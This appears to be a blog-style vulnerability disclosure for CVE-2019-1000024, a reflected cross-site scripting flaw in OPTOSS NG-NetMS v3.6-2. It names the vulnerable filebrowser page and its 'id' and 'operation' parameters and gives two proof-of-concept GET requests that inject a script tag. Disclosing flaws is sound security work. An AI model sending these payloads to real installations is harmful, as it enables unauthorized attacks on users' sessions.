---
layout: post
title:  "Cross-site scripting (XSS) in OPTOSS Next Gen Network Management System (NG-NetMS)"
date:   2019-01-20 19:51:02 +0700 
categories: [cve]
---

Vendor: OPT/NET BV

Product: OPTOSS Next Gen Network Management System (NG-NetMS)

Version affected: NG-NetMS v3.6-2 and earlier versions

#### Product description:
Opt/Net develops Next Gen Network Management System (NG-NetMS). This is a new web based end-to-end management tool. This project is nearly 14 years old and already proved to be indispensable tool for rapid data collection during audits and network infrastructure assessments.

This product provides near real-time visibility of the networks and ITC infrastructures and interconnected computing resources.

* CVE ID: CVE-2019-1000024
* CWE ID: CWE-79

#### #Proof of Concept

Multiple reflected cross-site scripting (XSS) vulnerabilities were discovered in the product.

A cross-site scripting vulnerability was identified on the /js/libs/jstree/demo/filebrowser/index.php page. The “id” and “operation” GET parameters can be used to inject arbitrary JavaScript which is returned in the page's response.

The following Proof of Concept (PoC) demonstrates the attack as well as displaying evidence of the script payload being returned in the response. 

#### Request:
{% highlight ruby %}
POC 1:

GET /js/libs/jstree/demo/filebrowser/index.php?id=%23'<script >prompt('xss')</script>&operation=get_node HTTP/1.1
Referer: http://a.b.c.d:80/index.php?r=site/login
Cookie: PHPSESSID=p4j7rspfhqhpu5duj60um2gaq1
Host: a.b.c.d
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

POC 2:

GET /js/libs/jstree/demo/filebrowser/index.php?id=%23&operation=get_node'<script >prompt('xss')</script> HTTP/1.1
Referer: http://a.b.c.d:80/index.php?r=site/login
Cookie: PHPSESSID=p4j7rspfhqhpu5duj60um2gaq1
Host: a.b.c.d
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
{% endhighlight %}

#### References:
1. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
2. https://opt-net.eu/products/optoss-ng-netms
3. https://sourceforge.net/projects/ngnms/
